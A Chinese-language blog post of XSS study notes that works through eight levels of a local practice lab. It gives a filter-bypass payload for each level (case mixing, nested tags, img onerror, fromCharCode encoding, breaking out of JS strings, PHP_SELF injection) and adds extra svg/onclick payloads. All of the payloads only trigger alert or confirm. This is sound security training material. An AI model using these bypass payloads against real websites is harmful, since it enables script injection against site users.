---
title: XSS学习笔记
tags: [XSS]
categories: [网络安全]
date: 2016-03-23 21:47:05
---

跨站脚本 (Cross-Site Scripting, `XSS`) 是一种经常出现在Web应用程序中的计算机安全漏洞。
形成原因和SQL注入一样, 是因为Web容器将用户提交的**数据**当代码解析执行了。

下面, 我们将用自己搭建的本地环境测试, 介绍一下XSS通常都有哪些**姿势**

<!-- more -->

**[XSS环境下载地址](https://github.com/kba977/xss_labs)**, 大家可以对照源码来学习XSS的绕过姿势。

## 1. 第一关 
非常简单, 直接输入payload即可。

    <script>alert(1)</script> 

    http://10.211.55.7/xss/example1.php?name=<script>alert(1)</script>
![](https://blog-1256977701.cos.ap-chengdu.myqcloud.com/XSS学习笔记/1_第一关.jpg)

## 2. 第二关
过滤掉了**小写**的**script**, 可以使用大小写混合的方法绕过。

    <sCrIpt>alert(1)</sCriPt>

    http://10.211.55.7/xss/example2.php?name=<sCrIpt>alert(1)</sCriPt>
![](https://blog-1256977701.cos.ap-chengdu.myqcloud.com/XSS学习笔记/1_第二关.jpg)

## 3. 第三关
过滤了**不区分大小写**的`<script>`与`</script>`，可以使用**嵌套**的script标签绕过。

    <sc<script>ript>alert(1)</sc</script>ript>

    http://10.211.55.7/xss/example3.php?name=<sc<script>ript>alert(1)</sc</script>ript>
![](https://blog-1256977701.cos.ap-chengdu.myqcloud.com/XSS学习笔记/1_第三关.jpg)

## 4. 第四关
判断包含`script`字符串即报错, 可以使用其他标签如`img`绕过。

    <img src=x onerror="alert(1)">

    http://10.211.55.7/xss/example4.php?name=<img src=x onerror="alert(1)">
![](https://blog-1256977701.cos.ap-chengdu.myqcloud.com/XSS学习笔记/1_第四关.jpg)

## 5. 第五关
判断包含alert字符串即报错, 可以使用编码方式绕过。

    <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
    或
    <img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">

    http://10.211.55.7/xss/example5.php?name=<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
![](https://blog-1256977701.cos.ap-chengdu.myqcloud.com/XSS学习笔记/1_第五关.jpg)

## 6. 第六关
直接在js环境中输出php变量, 可以通过构造js脚本绕过。

    ";b=alert(1); eval(b);//
    或
    ";alert(1);//
    或
    </script><script>alert(1)// (通过直接闭合前前后`script`来达到目的, 该方法在第七关不可用, 因为`<`和`>`被实体编码了/(ㄒoㄒ)/~~)

    http://10.211.55.7/xss/example6.php?name=";b=alert(1);eval(b);//
![](https://blog-1256977701.cos.ap-chengdu.myqcloud.com/XSS学习笔记/1_第六关.jpg)

## 7. 第七关
在js环境中输出通过html编码的php变量, `htmlentities`没有过滤单引号, 使用单引号绕过。

    ';b=alert(1);eval(b);//
    或
    ';alert(1);//

    http://10.211.55.7/xss/example7.php?name=';b=alert(1);eval(b);//
![](https://blog-1256977701.cos.ap-chengdu.myqcloud.com/XSS学习笔记/1_第七关.jpg)

## 8. 第八关
第八个xss的post地址使用了当前url, 达到构造当前url地址达到xss目的

    /"method="post"><script>alert(1)</script>

    http://10.211.55.7/xss/example8.php/"method="post"><script>alert(1)</script>
![](https://blog-1256977701.cos.ap-chengdu.myqcloud.com/XSS学习笔记/1_第八关.jpg)

另外, 介绍另外几个**payload**

- `"/><svg/onload=alert(1)>` 可绕过前4关
- `"></script><c/onclick=confirm(1)>ccc` 可绕过第5和第6关

最后, 推荐 google 的 xss-game, 共6关, 有兴趣的同学可以试试哟 :P

[Google的xss-game(需翻墙)](https://xss-game.appspot.com/)